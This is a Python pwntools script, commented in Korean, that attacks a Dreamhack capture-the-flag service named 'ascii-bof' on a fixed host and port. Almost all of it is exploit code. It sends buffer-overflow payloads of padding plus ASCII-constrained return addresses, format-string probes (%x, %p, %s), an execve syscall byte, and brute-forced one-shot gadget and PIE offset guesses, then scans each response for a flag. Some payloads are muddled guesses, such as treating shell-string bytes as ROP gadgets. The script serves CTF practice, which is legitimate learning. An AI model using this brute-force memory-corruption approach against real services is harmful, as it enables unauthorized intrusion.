#!/usr/bin/env python3

"""
ASCII-BOF 대안 접근법 - ROP 체인 및 다른 기법들
"""

from pwn import *

def test_rop_approach():
    """ROP 체인 접근법"""
    print("[+] ROP 체인 접근법 테스트")
    print("=" * 50)
    
    HOST = 'host8.dreamhack.games'
    PORT = 12458
    
    # 일반적인 ROP 가젯들 (ASCII 호환)
    ascii_gadgets = [
        b"AAAAAA",  # 더미
        b"BBBBBB",  # 더미
        b"CCCCCC",  # 더미  
        b"!/bin/",  # 셸 관련
        b"/sh\x00\x00\x00",  # 셸 관련
    ]
    
    # 다양한 ROP 체인 구성
    for i, gadget in enumerate(ascii_gadgets):
        if not all(0x20 < b < 0x7f or b == 0 for b in gadget):
            continue
            
        print(f"\n가젯 {i+1}: {gadget}")
        
        payload = b"A" * 16 + b"B" * 8 + gadget
        
        try:
            r = remote(HOST, PORT)
            r.recvline()
            r.send(payload + b'\n')
            
            response = r.recvall(timeout=3)
            print(f"응답: {response}")
            
            if b'DH{' in response:
                print("🎉 ROP 성공!")
                flag_match = re.search(rb'DH\{[^}]+\}', response)
                if flag_match:
                    return flag_match.group(0).decode()
            
            r.close()
            
        except Exception as e:
            print(f"오류: {e}")
    
    return None

def test_format_string():
    """포맷 스트링 공격 테스트"""
    print("\n[+] 포맷 스트링 공격 테스트")
    print("=" * 50)
    
    HOST = 'host8.dreamhack.games'
    PORT = 12458
    
    format_strings = [
        b"%x %x %x %x",
        b"%p %p %p %p",
        b"%s %s %s %s",
        b"%d %d %d %d",
    ]
    
    for fmt in format_strings:
        if not all(0x20 < b < 0x7f for b in fmt):
            continue
            
        print(f"\n포맷 스트링: {fmt}")
        
        try:
            r = remote(HOST, PORT)
            r.recvline()
            r.send(fmt + b'\n')
            
            response = r.recvall(timeout=3)
            print(f"응답: {response}")
            
            if b'DH{' in response:
                print("🎉 포맷 스트링 성공!")
                flag_match = re.search(rb'DH\{[^}]+\}', response)
                if flag_match:
                    return flag_match.group(0).decode()
            
            r.close()
            
        except Exception as e:
            print(f"오류: {e}")
    
    return None

def test_system_calls():
    """시스템 콜 관련 테스트"""
    print("\n[+] 시스템 콜 테스트")
    print("=" * 50)
    
    HOST = 'host8.dreamhack.games'
    PORT = 12458
    
    # ASCII 호환 시스템 콜 관련 바이트들
    syscall_payloads = [
        b"A" * 16 + b"B" * 8 + b"\x3b\x00\x00\x00\x00\x00",  # execve syscall
        b"A" * 16 + b"B" * 8 + b"sys\x00\x00\x00",  # system 관련
        b"A" * 16 + b"B" * 8 + b"flag\x00\x00",  # flag 관련
    ]
    
    for i, payload in enumerate(syscall_payloads):
        # ASCII 체크
        non_buffer = payload[24:]  # 버퍼 이후 부분만 체크
        if not all(0x20 < b < 0x7f or b == 0 for b in non_buffer):
            print(f"페이로드 {i+1}: ASCII 비호환")
            continue
            
        print(f"\n시스템 콜 페이로드 {i+1}:")
        print(f"길이: {len(payload)}")
        print(f"페이로드: {payload}")
        
        try:
            r = remote(HOST, PORT)
            r.recvline()
            r.send(payload + b'\n')
            
            response = r.recvall(timeout=3)
            print(f"응답: {response}")
            
            if b'DH{' in response:
                print("🎉 시스템 콜 성공!")
                flag_match = re.search(rb'DH\{[^}]+\}', response)
                if flag_match:
                    return flag_match.group(0).decode()
            
            r.close()
            
        except Exception as e:
            print(f"오류: {e}")
    
    return None

def test_one_shot_gadgets():
    """원샷 가젯 테스트"""
    print("\n[+] 원샷 가젯 테스트")  
    print("=" * 50)
    
    HOST = 'host8.dreamhack.games'
    PORT = 12458
    
    # 일반적인 원샷 가젯 주소들 (ASCII 호환 버전)
    possible_gadgets = []
    
    # 0x4로 시작하는 주소들 (ASCII 호환)
    for low in range(0x4000, 0x5000, 0x100):
        for mid in range(0x40, 0x7f):
            addr = 0x004000000000 | (mid << 16) | low
            addr_bytes = p64(addr)[:6]
            
            if all(0x20 < b < 0x7f for b in addr_bytes):
                possible_gadgets.append(addr)
    
    print(f"테스트할 가젯 수: {len(possible_gadgets)}")
    
    for i, gadget_addr in enumerate(possible_gadgets[:20]):  # 처음 20개만
        addr_bytes = p64(gadget_addr)[:6]
        payload = b"A" * 16 + b"B" * 8 + addr_bytes
        
        print(f"\n가젯 {i+1}: 0x{gadget_addr:x}")
        print(f"바이트: {addr_bytes.hex()}")
        
        try:
            r = remote(HOST, PORT)
            r.recvline()
            r.send(payload + b'\n')
            
            response = r.recvall(timeout=3)
            print(f"응답: {response}")
            
            if b'DH{' in response:
                print(f"🎉 원샷 가젯 성공! 주소: 0x{gadget_addr:x}")
                flag_match = re.search(rb'DH\{[^}]+\}', response)
                if flag_match:
                    return flag_match.group(0).decode()
            
            r.close()
            
        except Exception as e:
            print(f"오류: {e}")
    
    return None

def test_alternative_offsets():
    """대안 함수 오프셋들 테스트"""
    print("\n[+] 대안 함수 오프셋 테스트")
    print("=" * 50)
    
    HOST = 'host8.dreamhack.games'
    PORT = 12458
    
    # 다양한 가능한 오프셋들
    offsets = []
    
    # 1000번대
    for i in range(0x1000, 0x2000, 0x10):
        offsets.append(i)
    
    # 특별한 오프셋들
    special_offsets = [
        0x1180, 0x1190, 0x11a0, 0x11b0, 0x11c0, 0x11d0, 0x11e0, 0x11f0,
        0x1280, 0x1290, 0x12a0, 0x12b0, 0x12c0, 0x12d0, 0x12e0, 0x12f0,
        0x1380, 0x1390, 0x13a0, 0x13b0, 0x13c0, 0x13d0, 0x13e0, 0x13f0,
    ]
    
    offsets.extend(special_offsets)
    
    pie_base = 0x555555554000
    
    tested = 0
    for offset in offsets:
        if tested >= 50:  # 50개만 테스트
            break
            
        addr = pie_base + offset
        addr_bytes = p64(addr)[:6]
        
        # ASCII 호환성 체크
        if not all(0x20 < b < 0x7f for b in addr_bytes):
            continue
        
        tested += 1
        payload = b"A" * 16 + b"B" * 8 + addr_bytes
        
        print(f"\n오프셋 0x{offset:x} (주소: 0x{addr:x})")
        print(f"바이트: {addr_bytes.hex()}")
        
        try:
            r = remote(HOST, PORT)
            r.recvline()
            r.send(payload + b'\n')
            
            response = r.recvall(timeout=3)
            print(f"응답: {response}")
            
            if b'DH{' in response:
                print(f"🎉 성공! 오프셋: 0x{offset:x}")
                flag_match = re.search(rb'DH\{[^}]+\}', response)
                if flag_match:
                    return flag_match.group(0).decode()
            
            r.close()
            
        except Exception as e:
            print(f"오류: {e}")
    
    return None

def manual_test():
    """수동 테스트 - 사용자가 직접 주소 입력"""
    print("\n[+] 수동 테스트")
    print("=" * 50)
    
    # 바이너리를 다시 분석해서 정확한 주소 찾기
    print("바이너리 재분석을 위해 objdump 결과 확인:")
    
    try:
        # objdump로 다시 분석
        result = subprocess.run(['objdump', '-d', 'ascii-bof'], 
                              capture_output=True, text=True)
        
        # flag 함수 찾기
        lines = result.stdout.split('\n')
        for i, line in enumerate(lines):
            if 'flag>' in line or 'flag:' in line:
                print(f"발견: {line}")
                # 주변 라인들도 출력
                for j in range(max(0, i-2), min(len(lines), i+10)):
                    print(f"  {lines[j]}")
                break
    except:
        print("objdump 실행 실패")
    
    return None

if __name__ == "__main__":
    import re
    import subprocess
    
    print("🔧 ASCII-BOF 대안 접근법")
    print("=" * 60)
    
    flag = None
    
    # 1. ROP 체인 시도 
    if not flag:
        flag = test_rop_approach()
    
    # 2. 포맷 스트링 공격
    if not flag:
        flag = test_format_string()
    
    # 3. 시스템 콜 테스트
    if not flag:
        flag = test_system_calls()
    
    # 4. 원샷 가젯 테스트
    if not flag:
        flag = test_one_shot_gadgets()
    
    # 5. 대안 오프셋 테스트
    if not flag:
        flag = test_alternative_offsets()
    
    # 6. 수동 분석
    if not flag:
        manual_test()
    
    if flag:
        print(f"\n🎉🎉🎉 최종 성공!")
        print(f"🏆 ASCII-BOF 플래그: {flag}")
    else:
        print("\n🤔 모든 대안 접근법 실패")
        print("바이너리를 다시 분석하거나 다른 접근이 필요합니다.")
